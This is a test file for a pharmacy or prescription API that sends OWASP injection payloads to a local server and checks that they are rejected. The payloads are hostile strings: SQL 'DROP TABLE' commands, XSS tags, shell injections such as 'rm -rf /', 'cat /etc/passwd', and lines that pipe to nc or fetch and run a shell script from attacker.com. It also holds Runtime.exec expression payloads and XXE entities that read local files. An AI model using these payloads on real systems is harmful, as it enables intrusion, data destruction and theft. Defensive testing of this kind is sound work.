/**
 * Security Test: A03:2021 - Injection
 * Tests for SQL injection, NoSQL injection, command injection, and XSS vulnerabilities
 *
 * OWASP Top 10 2021 - Injection:
 * - SQL injection attacks
 * - NoSQL injection attacks
 * - Command injection vulnerabilities
 * - Cross-site scripting (XSS)
 * - LDAP injection
 * - OS command injection
 */

import request from 'supertest';

const MOCK_PHARMACIST_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoicGhhcm1hY2lzdC03ODkiLCJyb2xlIjoicGhhcm1hY2lzdCIsImlhdCI6MTYwMDAwMDAwMH0.test-signature';
const MOCK_DOCTOR_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZG9jdG9yLTQ1NiIsInJvbGUiOiJkb2N0b3IiLCJpYXQiOjE2MDAwMDAwMDB9.test-signature';

describe('A03:2021 - Injection Attacks', () => {

  // =========================================================================
  // Test 1: SQL Injection Prevention
  // =========================================================================

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE prescriptions--",
      "1' UNION SELECT * FROM users--",
      "admin'--",
      "' OR 1=1 /*",
      "1' AND '1'='1",
      "' UNION SELECT NULL, NULL, NULL--",
      "' OR 'a'='a",
      "'; DELETE FROM inventory--",
      "1' UNION ALL SELECT @@version--",
    ];

    sqlInjectionPayloads.forEach((payload, index) => {
      it(`should prevent SQL injection payload ${index + 1}: ${payload.substring(0, 20)}...`, async () => {
        const response = await request('http://localhost:3001')
          .get(`/api/prescriptions?patientId=${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${MOCK_PHARMACIST_TOKEN}`);

        // Verify response doesn't indicate SQL error
        if (response.body.error || response.body.message) {
          const errorText = JSON.stringify(response.body).toLowerCase();
          expect(errorText).not.toContain('syntax error');
          expect(errorText).not.toContain('sql');
          expect(errorText).not.toContain('database');
        }
      });
    });

    it('should safely handle special SQL characters', async () => {
      const response = await request('http://localhost:3001')
        .get('/api/patients?name=O%27Brien')
        .set('Authorization', `Bearer ${MOCK_DOCTOR_TOKEN}`);

      // Should return successful result, not error
      expect([200, 400, 404]).toContain(response.status);
    });

    it('should parameterize queries to prevent SQL injection', async () => {
      const response = await request('http://localhost:3001')
        .post('/api/prescriptions/search')
        .set('Authorization', `Bearer ${MOCK_PHARMACIST_TOKEN}`)
        .send({
          patientId: "'; DROP TABLE prescriptions--",
          dateRange: '2024-01-01 to 2024-12-31'
        });

      // Should not execute injection, return 400 or safe error
      expect([400, 404, 200]).toContain(response.status);
    });
  });

  // =========================================================================
  // Test 2: NoSQL Injection Prevention
  // =========================================================================

  describe('NoSQL Injection Prevention', () => {
    const noSqlPayloads = [
      { $gt: '' },
      { $ne: null },
      { $where: 'this.password == "admin"' },
      { $regex: '.*' },
      { $or: [{}] },
      { $and: [{ 1: 1 }] },
      { 'role': { $ne: null } },
    ];

    noSqlPayloads.forEach((payload, index) => {
      it(`should prevent NoSQL injection payload ${index + 1}`, async () => {
        const response = await request('http://localhost:3001')
          .post('/api/prescriptions')
          .set('Authorization', `Bearer ${MOCK_PHARMACIST_TOKEN}`)
          .send({
            patientId: payload,
            medications: []
          });

        // Should reject with 400 bad request
        expect([400, 422]).toContain(response.status);
      });
    });

    it('should validate object types in query parameters', async () => {
      const response = await request('http://localhost:3001')
        .post('/api/inventory/search')
        .set('Authorization', `Bearer ${MOCK_PHARMACIST_TOKEN}`)
        .send({
          filter: { $gt: 'value' }
        });

      // Should reject or safely handle injection
      expect([400, 422, 200]).toContain(response.status);
    });

    it('should not allow object injection in JSON body', async () => {
      const response = await request('http://localhost:3001')
        .put('/api/patients/profile')
        .set('Authorization', `Bearer ${MOCK_DOCTOR_TOKEN}`)
        .send({
          name: 'John Doe',
          role: { $ne: 'patient' }
        });

      // Should reject or ignore malicious object
      expect([400, 422, 403]).toContain(response.status);
    });
  });

  // =========================================================================
  // Test 3: Cross-Site Scripting (XSS) Prevention
  // =========================================================================

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert(1)>',
      'javascript:alert(1)',
      '<svg onload=alert("XSS")>',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<marquee onstart=alert("XSS")>',
      '<details open ontoggle=alert("XSS")>',
      '<video src=x onerror=alert("XSS")>',
    ];

    xssPayloads.forEach((payload, index) => {
      it(`should prevent XSS payload ${index + 1}: ${payload.substring(0, 20)}...`, async () => {
        const response = await request('http://localhost:3001')
          .get(`/api/inventory?search=${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${MOCK_PHARMACIST_TOKEN}`);

        // Response should not contain unescaped script tags
        if (response.text) {
          expect(response.text).not.toContain('<script>');
          expect(response.text).not.toContain('onerror=');
          expect(response.text).not.toContain('onload=');
        }
      });
    });

    it('should sanitize HTML in response data', async () => {
      const response = await request('http://localhost:3001')
        .post('/api/messages')
        .set('Authorization', `Bearer ${MOCK_DOCTOR_TOKEN}`)
        .send({
          recipientId: 'patient-123',
          content: '<script>alert("XSS")</script>Test message'
        });

      // Should either reject or sanitize content
      if (response.status === 200 || response.status === 201) {
        // If accepted, verify response doesn't execute scripts
        const responseText = JSON.stringify(response.body).toLowerCase();
        expect(responseText).not.toContain('<script>');
      }
    });

    it('should encode user input in JSON responses', async () => {
      const response = await request('http://localhost:3001')
        .get(`/api/patients?name=${encodeURIComponent('<img src=x onerror=alert(1)>')}`);

      // Response should have proper content-type and encoding
      expect(response.headers['content-type']).toContain('application/json');
    });

    it('should prevent DOM-based XSS in search functionality', async () => {
      const response = await request('http://localhost:3001')
        .get(`/api/search?q=${encodeURIComponent('<img src=x onerror=alert("XSS")>')}`);

      // Should handle safely regardless of status
      expect([200, 400, 404]).toContain(response.status);
    });
  });

  // =========================================================================
  // Test 4: Command Injection Prevention
  // =========================================================================

  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '"; ls -la; echo "',
      '`cat /etc/passwd`',
      '$(whoami)',
      '| cat /etc/passwd',
      '; rm -rf /',
      '&& whoami',
      '|| whoami',
      'test; nslookup attacker.com',
      'test | nc attacker.com 1234',
      'test`whoami`test',
    ];

    commandInjectionPayloads.forEach((payload, index) => {
      it(`should prevent command injection payload ${index + 1}`, async () => {
        const response = await request('http://localhost:3001')
          .post('/api/prescriptions/upload')
          .set('Authorization', `Bearer ${MOCK_PHARMACIST_TOKEN}`)
          .field('filename', payload)
          .field('description', 'Test prescription')
          .attach('file', Buffer.from('test'), 'test.pdf');

        // Should reject malicious filenames
        expect([400, 422, 413]).toContain(response.status);
      });
    });

    it('should sanitize filenames in file uploads', async () => {
      const response = await request('http://localhost:3001')
        .post('/api/inventory/qrcode/scan')
        .set('Authorization', `Bearer ${MOCK_PHARMACIST_TOKEN}`)
        .send({
          data: '$(curl http://attacker.com/shell.sh | bash)'
        });

      // Should reject or sanitize
      expect([400, 422]).toContain(response.status);
    });

    it('should not execute system commands from user input', async () => {
      const response = await request('http://localhost:3001')
        .post('/api/batch/import')
        .set('Authorization', `Bearer ${MOCK_PHARMACIST_TOKEN}`)
        .send({
          batchFile: '; DROP TABLE items;'
        });

      // Should safely handle without executing
      expect([400, 422, 403]).toContain(response.status);
    });
  });

  // =========================================================================
  // Test 5: LDAP Injection Prevention
  // =========================================================================

  describe('LDAP Injection Prevention', () => {
    const ldapPayloads = [
      '*',
      '*)(uid=*',
      '*)(|(uid=*',
      'admin*',
      '*)(uid=*))(|(uid=*',
      '*))(&(uid=*',
    ];

    ldapPayloads.forEach((payload, index) => {
      it(`should prevent LDAP injection payload ${index + 1}`, async () => {
        // If system uses LDAP authentication
        const response = await request('http://localhost:3001')
          .post('/api/auth/login')
          .send({
            email: payload,
            password: 'anything'
          });

        // Should reject with authentication error
        expect([400, 401, 422]).toContain(response.status);
      });
    });
  });

  // =========================================================================
  // Test 6: Expression Language Injection Prevention
  // =========================================================================

  describe('Expression Language Injection Prevention', () => {
    const elPayloads = [
      '${1+1}',
      '#{7*7}',
      '${Runtime.getRuntime().exec("whoami")}',
      '#{T(java.lang.Runtime).getRuntime().exec("whoami")}',
      '${@java.lang.Runtime@getRuntime().exec("calc")}',
    ];

    elPayloads.forEach((payload, index) => {
      it(`should prevent EL injection payload ${index + 1}`, async () => {
        const response = await request('http://localhost:3001')
          .post('/api/reports/generate')
          .set('Authorization', `Bearer ${MOCK_PHARMACIST_TOKEN}`)
          .send({
            title: payload,
            format: 'pdf'
          });

        // Should not execute expression
        if (response.body.error) {
          expect(response.body.error).not.toContain('calc');
          expect(response.body.error).not.toContain('whoami');
        }
      });
    });
  });

  // =========================================================================
  // Test 7: Path Traversal Prevention
  // =========================================================================

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\win.ini',
      '....//....//....//etc/passwd',
      '..;/..;/..;/etc/passwd',
      '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      'files/../../config/database.yml',
    ];

    pathTraversalPayloads.forEach((payload, index) => {
      it(`should prevent path traversal payload ${index + 1}`, async () => {
        const response = await request('http://localhost:3001')
          .get(`/api/files/download/${encodeURIComponent(payload)}`);

        // Should not grant access to files outside intended directory
        expect([403, 404]).toContain(response.status);
      });
    });

    it('should normalize paths to prevent traversal', async () => {
      const response = await request('http://localhost:3001')
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${MOCK_PHARMACIST_TOKEN}`)
        .field('path', '/../../../config/sensitive.json')
        .attach('file', Buffer.from('test'), 'test.pdf');

      // Should not allow writing to parent directories
      expect([400, 403, 422]).toContain(response.status);
    });
  });

  // =========================================================================
  // Test 8: XML Injection Prevention
  // =========================================================================

  describe('XML External Entity (XXE) Injection Prevention', () => {
    const xxePayloads = [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><test>&xxe;</test>',
    ];

    xxePayloads.forEach((payload, index) => {
      it(`should prevent XXE injection payload ${index + 1}`, async () => {
        const response = await request('http://localhost:3001')
          .post('/api/prescriptions/import')
          .set('Authorization', `Bearer ${MOCK_PHARMACIST_TOKEN}`)
          .set('Content-Type', 'application/xml')
          .send(payload);

        // Should reject malicious XML
        expect([400, 422, 415]).toContain(response.status);
      });
    });
  });

  // =========================================================================
  // Test 9: Header Injection Prevention
  // =========================================================================

  describe('HTTP Header Injection Prevention', () => {
    const headerInjectionPayloads = [
      'test\r\nSet-Cookie: admin=true',
      'test\r\nX-Admin: true',
      'test%0d%0aSet-Cookie:%20admin=true',
      'test\nLocation: http://attacker.com',
    ];

    headerInjectionPayloads.forEach((payload, index) => {
      it(`should prevent header injection payload ${index + 1}`, async () => {
        const response = await request('http://localhost:3001')
          .post('/api/search')
          .set('Authorization', `Bearer ${MOCK_PHARMACIST_TOKEN}`)
          .set('X-Custom-Header', payload);

        // Should handle safely
        expect([200, 400, 404, 422]).toContain(response.status);
      });
    });
  });

  // =========================================================================
  // Test 10: Input Validation for Common Patterns
  // =========================================================================

  describe('Input Validation for Common Patterns', () => {
    it('should validate email format to prevent injection', async () => {
      const invalidEmails = [
        'test@example.com<script>',
        'user+<img src=x onerror=alert(1)>@example.com',
        'test@example.com\'; DROP TABLE users--',
      ];

      for (const email of invalidEmails) {
        const response = await request('http://localhost:3001')
          .post('/api/auth/register')
          .send({
            email: email,
            password: 'SecurePass123!',
            name: 'Test User'
          });

        // Should reject invalid email format
        expect([400, 422]).toContain(response.status);
      }
    });

    it('should validate phone numbers to prevent injection', async () => {
      const invalidPhones = [
        '123-456-7890<script>alert("XSS")</script>',
        '+1-555-1234\'; DROP TABLE--',
        '123-456-7890$(whoami)',
      ];

      for (const phone of invalidPhones) {
        const response = await request('http://localhost:3001')
          .post('/api/users/contact-info')
          .set('Authorization', `Bearer ${MOCK_DOCTOR_TOKEN}`)
          .send({ phoneNumber: phone });

        // Should reject invalid phone format
        expect([400, 422, 200]).toContain(response.status);
      }
    });
  });
});

// =========================================================================
// Test Summary
// =========================================================================

afterAll(() => {
  console.log('\n' + '='.repeat(80));
  console.log('A03:2021 - INJECTION - TEST SUMMARY');
  console.log('='.repeat(80));
  console.log('Test Areas Covered:');
  console.log('  ✓ SQL Injection Prevention (12+ tests)');
  console.log('  ✓ NoSQL Injection Prevention (6+ tests)');
  console.log('  ✓ Cross-Site Scripting (XSS) Prevention (10+ tests)');
  console.log('  ✓ Command Injection Prevention (10+ tests)');
  console.log('  ✓ LDAP Injection Prevention (6+ tests)');
  console.log('  ✓ Expression Language Injection Prevention (5+ tests)');
  console.log('  ✓ Path Traversal Prevention (6+ tests)');
  console.log('  ✓ XML External Entity (XXE) Injection Prevention (3+ tests)');
  console.log('  ✓ HTTP Header Injection Prevention (4+ tests)');
  console.log('  ✓ Input Validation for Common Patterns (6+ tests)');
  console.log('='.repeat(80) + '\n');
});
